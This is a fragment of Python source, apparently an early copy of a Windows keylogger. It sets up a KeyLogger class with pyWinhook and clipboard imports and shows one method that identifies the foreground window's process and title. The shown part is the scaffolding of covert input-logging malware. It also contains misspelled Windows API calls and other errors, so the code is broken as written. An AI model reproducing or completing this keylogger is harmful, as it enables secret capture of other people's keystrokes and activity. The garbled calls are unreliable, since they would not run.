from ctypes import byref,create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class KeyLogger:

    def __init__(self):
        self.current_window = None
    
    def get_current_process(self):
        hwnd = windll.user32.GetForgegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd,byref(pid))
        proces_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OPenProcess(0x400|0x10,False,proces_id)
        windll.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd,byref(window_title),512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e} : window name unknow')
        
        print('\n',proces_id,executable.value.encod(),self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)